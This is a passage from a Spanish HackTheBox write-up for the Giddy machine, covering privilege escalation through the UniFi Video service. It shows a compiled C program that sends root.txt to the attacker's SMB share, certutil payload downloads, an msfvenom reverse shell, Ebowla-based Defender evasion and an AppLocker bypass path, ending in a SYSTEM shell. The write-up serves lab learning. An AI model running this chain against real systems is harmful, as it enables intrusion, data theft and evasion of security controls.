    + CategoryInfo          : ObjectNotFound: <span class="o">(</span>.<span class="se">\t</span>askkill.exe:String<span class="o">)</span> <span class="o">[]</span>, CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
</code></pre></div></div>

<ul>
  <li>Si lo hacemos rápido vemos que el Windows Defender lo detecta como virus.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; .<span class="se">\t</span>askkill.exe
Program <span class="s1">'taskkill.exe'</span> failed to run: Operation did not <span class="nb">complete </span>successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .<span class="se">\t</span>askkill.exe
+ ~~~~~~~~~~~~~~.
At line:1 char:1
+ .<span class="se">\t</span>askkill.exe
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: <span class="o">(</span>:<span class="o">)</span> <span class="o">[]</span>, ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos hacer un Bypass.</p>
  </li>
  <li>
    <p>Vamos a usar <code class="language-plaintext highlighter-rouge">mingw-w64</code> <a href="https://learn.microsoft.com/es-es/vcpkg/users/platforms/mingw">https://learn.microsoft.com/es-es/vcpkg/users/platforms/mingw</a> para en vez de subir el <code class="language-plaintext highlighter-rouge">.exe</code> ala maquina vamos a crear un archivo <code class="language-plaintext highlighter-rouge">C</code> para compilar y así ya no lo detecte el defender.</p>
  </li>
  <li>
    <p>Lo que podemos decirle es que nos mande la <code class="language-plaintext highlighter-rouge">flag</code> de <code class="language-plaintext highlighter-rouge">root</code> a un recurso de nosotros.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>exc.c
<span class="c">#include &lt;stdlib.h&gt;</span>

int main<span class="o">(){</span>
	system<span class="o">(</span><span class="s2">"type C:</span><span class="se">\\</span><span class="s2">Users</span><span class="se">\\</span><span class="s2">Administrator</span><span class="se">\\</span><span class="s2">Desktop</span><span class="se">\\</span><span class="s2">root.txt &gt; </span><span class="se">\\\\</span><span class="s2">10.10.14.216</span><span class="se">\\</span><span class="s2">smbFolder</span><span class="se">\\</span><span class="s2">root.txt"</span><span class="o">)</span><span class="p">;</span>
<span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Ahora usamos la herramienta que instalamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content x86_64-w64-mingw32-gcc exc.c <span class="nt">-o</span> taskkill.exe
</code></pre></div></div>

<ul>
  <li>Vamos a mandarlo a la maquina victima otra vez.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.216:8080/taskkill.exe taskkill.exe
<span class="k">****</span>  Online  <span class="k">****</span>
  000000  ...
  01c0d2
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        6/16/2018   9:54 PM                bin
d-----        6/16/2018   9:55 PM                conf
d-----        6/16/2018  10:56 PM                data
d-----        6/16/2018   9:54 PM                email
d-----        6/16/2018   9:54 PM                fw
d-----        6/16/2018   9:54 PM                lib
d-----        4/26/2024   2:48 PM                logs
d-----        6/16/2018   9:55 PM                webapps
d-----        6/16/2018   9:55 PM                work
<span class="nt">-a----</span>        7/26/2017   6:10 PM         219136 avService.exe
<span class="nt">-a----</span>        6/17/2018  11:23 AM          31685 hs_err_pid1992.log
<span class="nt">-a----</span>        8/16/2018   7:48 PM         270597 hs_err_pid2036.mdmp
<span class="nt">-a----</span>        4/26/2024   4:40 PM         114898 taskkill.exe
<span class="nt">-a----</span>        6/16/2018   9:54 PM            780 Ubiquiti UniFi Video.lnk
<span class="nt">-a----</span>        7/26/2017   6:10 PM          48640 UniFiVideo.exe
<span class="nt">-a----</span>        7/26/2017   6:10 PM          32038 UniFiVideo.ico
<span class="nt">-a----</span>        6/16/2018   9:54 PM          89050 Uninstall.exe
</code></pre></div></div>

<ul>
  <li>Ahora iniciamos el <code class="language-plaintext highlighter-rouge">impacket-smbserver</code> por que en el script definimos que allí nos llegue la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<ul>
  <li>Ahora tenemos que conocer el nombre del servicio para poder pararlo y arrancarlo <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree">https://learn.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; <span class="nb">cd </span>HKLM:SYSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices
</code></pre></div></div>

<ul>
  <li>Vemos el nombre.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices&gt; <span class="nb">dir</span> | Select-String <span class="s1">'Unifi'</span>

HKEY_LOCAL_MACHINE<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices<span class="se">\U</span>niFiVideoService


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices
</code></pre></div></div>

<ul>
  <li>Ahora ya podemos parar el proceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices&gt; Stop-Service <span class="nt">-Name</span> UniFiVideoService <span class="nt">-Force</span>
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices&gt;
</code></pre></div></div>

<ul>
  <li>Y nos llega.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.129.96.140,49729<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>GIDDY<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User GIDDY<span class="se">\ </span>authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.129.96.140,49729<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
</code></pre></div></div>

<h2 id="root-flag">root flag</h2>

<ul>
  <li>Y vemos la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>root.txt
2873baf68c08b318321f3689ca29ad7a
</code></pre></div></div>

<h2 id="shell-as-root">Shell as root</h2>

<ul>
  <li>
    <p>Ahora vamos a ganar acceso pero con una consola.</p>
  </li>
  <li>
    <p>Vamos a volver a generar el <code class="language-plaintext highlighter-rouge">.exe</code> con <code class="language-plaintext highlighter-rouge">msfvenom</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.216 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> exe <span class="nt">-o</span> taskkill.exe
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: taskkill.exe
</code></pre></div></div>

<ul>
  <li>Vamos arrancar el servicio otra vez.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices&gt; cmd /c sc start UniFiVideoService

SERVICE_NAME: UniFiVideoService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                <span class="o">(</span>NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN<span class="o">)</span>
        WIN32_EXIT_CODE    : 0  <span class="o">(</span>0x0<span class="o">)</span>
        SERVICE_EXIT_CODE  : 0  <span class="o">(</span>0x0<span class="o">)</span>
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1148
        FLAGS              :
</code></pre></div></div>

<ul>
  <li>Podemos usar la siguiente herramienta para burla el defender <a href="https://github.com/Genetic-Malware/Ebowla">https://github.com/Genetic-Malware/Ebowla</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content git clone https://github.com/Genetic-Malware/Ebowla
Cloning into <span class="s1">'Ebowla'</span>...
remote: Enumerating objects: 559, <span class="k">done</span><span class="nb">.</span>
remote: Total 559 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 559
Receiving objects: 100% <span class="o">(</span>559/559<span class="o">)</span>, 35.46 MiB | 1.29 MiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>287/287<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
➜  content <span class="nb">mv </span>taskkill.exe Ebowla
➜  content <span class="nb">cd </span>Ebowla
➜  Ebowla git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">ls
</span>Eko_2016_Morrow_Pitts_Master.pdf                  cleanup.py
Infiltrate_2016_Morrow_Pitts_Genetic_Malware.pdf  documentation.md
LICENSE.md                                        ebowla.py
MemoryModule                                      encryption
README.md                                         formats.md
build_python.sh                                   genetic.config
build_x64_go.sh                                   taskkill.exe
build_x86_go.sh                                   templates
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora vamos a editar el <code class="language-plaintext highlighter-rouge">genetic.config</code>.</p>
  </li>
  <li>
    <p>Tiene que quedar de esta forma.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Ebowla git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">cat </span>genetic.config
<span class="o">[</span>Overall]

    <span class="c"># Options ENV, OTP</span>

    Encryption_Type <span class="o">=</span> ENV


    <span class="c"># Template output: GO, Python, OR PowerShell</span>

    output_type <span class="o">=</span> GO


    <span class="c"># Number of bytes subtracted from the reconstructed payload that will be the</span>
    <span class="c"># sha512 checksum used when checking the file before executing the payload.</span>

    minus_bytes <span class="o">=</span> 1


    <span class="c"># type of file being fed (payload) - also determines execution</span>
    <span class="c"># Python: EXE, DLL_x86, DLL_x64 are written to disk</span>
    <span class="c"># GO: Nothing is written to disk</span>
    <span class="c"># OPTIONS for GO: EXE, DLL_x86, DLL_x64, SHELLCODE</span>
    <span class="c"># OPTIONS for PYTHON: EXE, SHELLCODE, CODE, FILE_DROP</span>
    <span class="c"># OPTIONS for PowerShell: CODE, DLL_x86, DLL_x64, EXE, FILE_DROP</span>

    payload_type <span class="o">=</span> EXE


    <span class="c"># key_iterations is for otp_type = key and for symmetric_settings_win</span>
    <span class="c"># It is the number of times that the key hash is iterated via sha512 before being used</span>
    <span class="c"># as the encryption key.  NOT available to otp_type = full</span>

    key_iterations <span class="o">=</span> 10000

    <span class="c"># Clean the resulting loaders from comments and print statements</span>
    <span class="c"># This will make the runs faster and not display status information on the victim host</span>
    <span class="c"># Most useful once payloads have been tested and are ready for deployment</span>
    <span class="c"># Values Bool: True or False</span>

    clean_output <span class="o">=</span> False


<span class="o">[</span>otp_settings]
    <span class="c"># otp is simple, provide one time pad, type,  and starting search location</span>
    <span class="c"># type is full otp to reconstruct the malware in memory, or an offset in the file for a symmetric key</span>

    otp_type <span class="o">=</span> key <span class="c"># OPTIONS: full, key</span>


    <span class="c"># File for use with otp</span>

    pad <span class="o">=</span> <span class="s1">'cmd.exe'</span>

    <span class="c"># Max pad size: Decide the largest pad size to use.</span>
    <span class="c"># 256 ** 3 - 1 (16777215 or 0xffffff) maximum is supported</span>
    <span class="c"># Too small might be a bad idea...</span>

    pad_max <span class="o">=</span> 0xffffff

    <span class="c"># starting location in the path to start looking if walking the path</span>

    scan_dir <span class="o">=</span> <span class="s1">'c:\windows\sysnative'</span><span class="c">#'%APPDATA%'</span>


    <span class="c"># For use with FULL OTP:</span>
    <span class="c">#  Number of max bytes for matching the payload against the OTP</span>
    <span class="c">#  -- larger byte width equals possible smaller lookup table but longer build times</span>

    byte_width <span class="o">=</span> 9



<span class="o">[</span>symmetric_settings_win]
    <span class="c"># AES-CFB-256 key from a combination of the any of the following settings.</span>
    <span class="c"># Any of the following can be used, the more specific to your target the better.</span>


    <span class="c"># set the value to '' if you do not want to use that value</span>


    <span class="c"># This is not a permanent list.  Any env variable can be added below.</span>
    <span class="c"># If you want the env variable to be used, give it a value.</span>
    <span class="c"># These are case insensitive.</span>

    <span class="o">[[</span>ENV_VAR]]

        username <span class="o">=</span> <span class="s1">''</span>
        computername <span class="o">=</span> <span class="s1">'Giddy'</span>
        homepath <span class="o">=</span> <span class="s1">''</span>
        homedrive <span class="o">=</span> <span class="s1">''</span>
        Number_of_processors <span class="o">=</span> <span class="s1">''</span>
        processor_identifier <span class="o">=</span> <span class="s1">''</span>
        processor_revision <span class="o">=</span> <span class="s1">''</span>
        userdomain <span class="o">=</span> <span class="s1">''</span>
        systemdrive <span class="o">=</span> <span class="s1">''</span>
        userprofile <span class="o">=</span> <span class="s1">''</span>
        path <span class="o">=</span> <span class="s1">''</span>
        temp <span class="o">=</span> <span class="s1">''</span>


     <span class="o">[[</span>PATH]]

    <span class="c"># Check if a path exists on the workstation</span>
    <span class="c"># Only one path can be used.  This is immutable. To use, give it a value and a start location.</span>

        <span class="c"># This is the path that will be used as part of the key</span>

        path <span class="o">=</span> <span class="s1">''</span>

        <span class="c"># You can provide Env Variables that are associated with a path for the start_loc</span>
        <span class="c">#  , such as %TEMP%, %APPDATA%, %PROGRAMFILES%</span>
    <span class="c"># You Must use the %ENV VAR% when using env vars for paths!</span>
    <span class="c"># Examples: C:\Windows, C:\Program Files, %APPDATA%</span>

    start_loc <span class="o">=</span> <span class="s1">'%HOMEPATH%'</span>


    <span class="o">[[</span>IP_RANGES]]

    <span class="c"># Network mask for external enumeration 22.23.0.0</span>
    <span class="c"># IP mask should not be used alone more simple to brute force.</span>
    <span class="c"># Support for only 24 16 8 masks or exact ip</span>
    <span class="c"># 12.12.0.0 or 12.12.12.12 or 12.12.0.0 or 12.0.0.0</span>

    external_ip_mask <span class="o">=</span> <span class="s1">''</span>


    <span class="o">[[</span>SYSTEM_TIME]]

    <span class="c"># Time Range with BEGING and END in EPOC</span>
        <span class="c"># Should be used with another variable</span>
    <span class="c"># This is a mask: 20161001 or 20161000 or 20160000</span>
    <span class="c"># YEAR, MONTH, DAY</span>

    Time_Range <span class="o">=</span> <span class="s1">''</span>
</code></pre></div></div>

<ul>
  <li>Ahora lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Ebowla git:<span class="o">(</span>master<span class="o">)</span> ✗ python2 ebowla.py taskkill.exe genetic.config
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using Symmetric encryption
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Payload length 7168
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Payload_type exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using EXE payload template
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Used environment variables:
	<span class="o">[</span>-] environment value used: computername, value used: giddy
<span class="o">[!]</span> Path string not used as pasrt of key
<span class="o">[!]</span> External IP mask NOT used as part of key
<span class="o">[!]</span> System <span class="nb">time </span>mask NOT used as part of key
<span class="o">[</span><span class="k">*</span><span class="o">]</span> String used to <span class="nb">source </span>the encryption key: giddy
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Applying 10000 sha512 <span class="nb">hash </span>iterations before encryption
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption key: 91798b223b0690d70e3934063458f6bd14279758a6fe1bc78ff0c7fdb489be0c
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Writing GO payload to: go_symmetric_taskkill.exe.go
</code></pre></div></div>

<ul>
  <li>Y aquí no los guardo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Ebowla git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">ls</span> <span class="nt">-l</span> output
total 20
<span class="nt">-rw-r--r--</span> 1 miguel miguel 20223 Apr 26 15:34 go_symmetric_taskkill.exe.go
</code></pre></div></div>

<ul>
  <li>Ahora tenemos que compilarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Ebowla git:<span class="o">(</span>master<span class="o">)</span> ✗ ./build_x64_go.sh output/go_symmetric_taskkill.exe.go taskkill_ebowla.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Copy Files to tmp <span class="k">for </span>building
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Building...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Building <span class="nb">complete</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Copy taskkill_ebowla.exe to output
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Done
</code></pre></div></div>

<ul>
  <li>Allí tenemos el binario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  output git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">ls
</span>go_symmetric_taskkill.exe.go  taskkill_ebowla.exe
</code></pre></div></div>

<ul>
  <li>Después de cambiarle el nombre vamos a subirlo de nuevo ala maquina victima usando el servidor <code class="language-plaintext highlighter-rouge">http</code> con <code class="language-plaintext highlighter-rouge">python3</code> que teníamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; erase taskkill.exe
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.216:80/taskkill.exe taskkill.exe
<span class="k">****</span>  Online  <span class="k">****</span>
  000000  ...
  3dea72
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Pero ahora nos da otro error.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; .<span class="se">\t</span>askkill.exe
Program <span class="s1">'taskkill.exe'</span> failed to run: This program is blocked by group policy. For more information, contact your system administratorAt line:1 char:1
+ .<span class="se">\t</span>askkill.exe
+ ~~~~~~~~~~~~~~.
At line:1 char:1
+ .<span class="se">\t</span>askkill.exe
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: <span class="o">(</span>:<span class="o">)</span> <span class="o">[]</span>, ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
</code></pre></div></div>

<ul>
  <li>Aquí nos dicen rutas para que no nos pase eso <a href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md">https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; copy taskkill.exe C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\s</span>pool<span class="se">\d</span>rivers<span class="se">\c</span>olor<span class="se">\t</span>askkill.exe
</code></pre></div></div>

<ul>
  <li>Si lo ejecutamos nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\s</span>pool<span class="se">\d</span>rivers<span class="se">\c</span>olor&gt; .<span class="se">\t</span>askkill.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> IV: 1150b91085ef56a08ef912c3eb577bf7
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Size of encrypted_payload:  9600
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Hash of encrypted_payload: 0b07402cefb4af5c5479a73d1ce4c9263622edf5ec70b53c750207e111d46d967727a660aeb7de5b29c8327585d76eb7c03182940081d2fff0d0d664319600a7
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Number of keys: 1
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Final key_list: <span class="o">[</span>giddy]
<span class="o">==================================================</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key: giddy
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Computed Full Key @ 2710 iterations: 91798b223b0690d70e3934063458f6bd14279758a6fe1bc78ff0c7fdb489be0c8a0e4c69b5ea1fba75d8bce580a3a7a51df239e28be0c36675dd065b1d4dd921
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AES Password 91798b223b0690d70e3934063458f6bd14279758a6fe1bc78ff0c7fdb489be0c
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Decoded Payload with Padding: 2e95bce3869bea6029ee864c4d9765424a36413a268f452c532259ee2faecc6708d839228cc51165614c0e8f8a1c0396b5695db2c1eba525c3d121cf9b4de819
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Message Length: 7168
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Message Length w/ Padding: 7168
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Test Hash : 1392fb2eafe3dfd6a8e0ff9159df555b5ec2f19ff617c78811ecf66834abdd9062b8dfc7d3696311ecaf53834c9bad4efbb02107a2fb0fd9378547686374fe32
Search Hash: 1392fb2eafe3dfd6a8e0ff9159df555b5ec2f19ff617c78811ecf66834abdd9062b8dfc7d3696311ecaf53834c9bad4efbb02107a2fb0fd9378547686374fe32
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Hashes Match
Len full_payload: 7168
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key Combinations:  <span class="o">[[</span>giddy]]
</code></pre></div></div>

<ul>
  <li>Con esto podemos ver que si funciona pero queremos estar como el administrador si recordamos necesitamos parar el servicio y arrancarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; Stop-Service <span class="nt">-Name</span> UniFiVideoService <span class="nt">-Force</span>
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
</code></pre></div></div>

<ul>
  <li>Y ahora ya estamos como <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.216] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.96.140] 49774
Microsoft Windows <span class="o">[</span>Version 10.0.14393]
<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. All rights reserved.

C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt;whoami
<span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt;
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Blackfield (hard)</title><link href="http://localhost:4000/hackthebox/machines/hard/2024/04/20/blackfield.html" rel="alternate" type="text/html" title="HackTheBox - Blackfield (hard)" /><published>2024-04-20T00:00:00-06:00</published><updated>2024-04-20T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/hard/2024/04/20/blackfield</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/hard/2024/04/20/blackfield.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/7c69c876f496cd729a077277757d219d.png" />
</p>

<ul>
